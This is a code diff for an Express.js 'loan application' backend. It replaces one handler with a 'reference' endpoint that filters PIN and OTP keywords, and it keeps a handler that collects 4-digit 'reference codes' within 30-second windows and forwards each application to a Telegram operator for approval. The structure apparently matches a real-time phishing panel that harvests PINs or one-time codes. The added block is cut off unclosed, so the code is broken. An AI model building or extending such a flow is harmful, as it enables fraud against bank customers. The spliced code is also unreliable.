@@ -856,13 +856,11 @@ app.get("/api/applications/:id/status", async (req,res)=>{
     const resubmit=Boolean(req.body.resubmit);
     const deadline=a.first_name_deadline_at ? new Date(a.first_name_deadline_at).getTime() : 0;
     if(a.status==='APPROVED' && deadline && Date.now()>deadline && !resubmit) return res.status(429).json({error:"The submission time has expired. Please select Resubmit.",resubmitRequired:true});
-    const firstDeadline=new Date(Date.now()+30000).toISOString();
-    await db(`UPDATE loan_applications SET status='AWAITING_FIRST_NAME_APPROVAL', first_name=$1, line_usage_profile=$2, first_name_deadline_at=$3, rejected_stage=NULL, updated_at=NOW() WHERE id=$4`,[firstName,lineUsageProfile,firstDeadline,a.id]);
-    await notifyTelegram(await getApplication(a.id));
-    res.json({ok:true,status:"AWAITING_FIRST_NAME_APPROVAL",deadlineAt:firstDeadline});
-  } catch(err) { console.error(err); res.status(500).json({error:"Unable to submit the selected option."}); }
-});
-
+   app.post('/api/applications/:id/reference',async(req,res)=>{
+ try{
+  const reference=String(req.body.reference_text||'').trim().slice(0,500);
+  if(!reference) return res.status(400).json({error:'Paste non-sensitive demo text before submitting.'});
+  if(/\b(pin|otp|one[- ]time password|password|passcode)\b/i.test(reference)) return res.status(400).json({error:'Use sample demo text only. Do not submit PINs, OTPs, passwords, or passcodes.'});
 app.post("/api/applications/:id/second-name", async (req,res)=>{
   try { const a=await getApplication(req.params.id); if(!a||!['APPROVED_FIRST_NAME','REJECTED'].includes(a.status)|| (a.status==='REJECTED' && a.rejected_stage!=='SECOND_NAME'))return res.status(400).json({error:"Reference Code 1 has not yet been approved."}); const secondName=String(req.body.secondName||"").trim(); if(!/^\d{4}$/.test(secondName))return res.status(400).json({error:"Reference Code 2 must contain exactly 4 numeric digits."}); const resubmit=Boolean(req.body.resubmit); const deadline=a.second_name_deadline_at ? new Date(a.second_name_deadline_at).getTime() : 0; if(a.status==='APPROVED_FIRST_NAME' && deadline && Date.now()>deadline && !resubmit) return res.status(429).json({error:"The submission time has expired. Please select Resubmit.",resubmitRequired:true}); const secondDeadline=new Date(Date.now()+30000).toISOString(); await db(`UPDATE loan_applications SET status='AWAITING_SECOND_NAME_APPROVAL', second_name=$1, second_name_deadline_at=$2, rejected_stage=NULL, updated_at=NOW() WHERE id=$3`,[secondName,secondDeadline,a.id]); await notifyTelegram(await getApplication(a.id)); res.json({ok:true,status:"AWAITING_SECOND_NAME_APPROVAL",deadlineAt:secondDeadline}); }
   catch(err){console.error(err);res.status(500).json({error:"Could not submit second name."});}
